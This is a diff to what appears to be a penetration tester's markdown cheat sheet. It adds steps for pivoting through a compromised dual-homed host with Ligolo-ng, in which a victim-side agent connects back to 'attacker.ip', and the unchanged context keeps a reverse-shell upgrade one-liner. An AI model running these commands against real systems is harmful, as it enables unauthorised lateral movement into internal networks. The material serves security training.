@@ -90,6 +90,33 @@ Clean nmap output for port scan<br>
 ### Shell Upgrade
 `python -c 'import pty; pty.spawn("/bin/bash")'`; ctrl -z; stty raw -echo; fg; export TERM=xterm
 
+### Pivoting with Ligolo - https://github.com/nicocha30/ligolo-ng
+```
+Server agent from attacker host then from the victim host(that has 2 nics) retrieve the ligolo agent.
+
+From attacker host:
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+ip addr show ligolo //will show interface is available, will initially have "down" in red
+./proxy -selfcert //starts ligolo 
+
+From victim host:
+./agent -connect attacker.ip:11601 -ignore-cert //11601 is the default port for ligolo
+
+From attacker host:
+session //select new connection
+ipconfig //shows the networks the machine is connected to
+
+Set up the route. Open a new terminal in attacker host
+sudo ip route add <IP.of.the.internal.network.you.want.to.reach>/24 dev ligolo
+
+From attacker host, from the context of our agent session:
+start
+
+Can now reach the <IP.of.the.internal.network.you.want.to.reach> through your kali box. no proychains necessary.
+```
+
+
 ## Resources and Links
 |Description|Link|
 |-----------|----|
